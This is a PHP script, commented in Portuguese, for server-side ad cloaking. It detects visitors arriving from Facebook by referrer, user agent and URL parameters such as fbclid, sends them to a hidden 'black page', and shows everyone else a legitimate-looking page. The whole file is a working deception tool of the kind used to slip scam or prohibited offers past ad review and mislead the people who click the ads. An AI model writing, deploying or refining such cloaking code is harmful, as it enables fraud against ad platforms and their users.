<?php
// Cloaker do lado do servidor (mais eficiente e seguro)

class ServerCloaker {
    private $facebookDomains = [
        'facebook.com', 'fb.com', 'm.facebook.com', 
        'l.facebook.com', 'lm.facebook.com'
    ];
    
    private $facebookUserAgents = [
        'facebookexternalhit', 'facebot', 'facebook', 'fbav'
    ];
    
    public function __construct() {
        $this->checkAndRedirect();
    }
    
    private function checkAndRedirect() {
        if ($this->isFromFacebook()) {
            $this->redirectToBlackPage();
        } else {
            $this->showLegitPage();
        }
    }
    
    private function isFromFacebook() {
        return $this->checkReferrer() || 
               $this->checkUserAgent() || 
               $this->checkUrlParams() ||
               $this->checkIP();
    }
    
    private function checkReferrer() {
        $referrer = strtolower($_SERVER['HTTP_REFERER'] ?? '');
        foreach ($this->facebookDomains as $domain) {
            if (strpos($referrer, $domain) !== false) {
                return true;
            }
        }
        return false;
    }
    
    private function checkUserAgent() {
        $userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
        foreach ($this->facebookUserAgents as $agent) {
            if (strpos($userAgent, $agent) !== false) {
                return true;
            }
        }
        return false;
    }
    
    private function checkUrlParams() {
        return isset($_GET['fbclid']) || 
               isset($_GET['fb_source']) || 
               (isset($_GET['utm_source']) && $_GET['utm_source'] === 'facebook');
    }
    
    private function checkIP() {
        // Implementar verificação de IP do Facebook se necessário
        // Esta é uma verificação mais avançada
        return false;
    }
    
    private function redirectToBlackPage() {
        header('Location: /black-page/', true, 302);
        exit();
    }
    
    private function showLegitPage() {
        // Inclui a página legítima
        include 'index.html';
    }
}

// Executa o cloaker
new ServerCloaker();
?>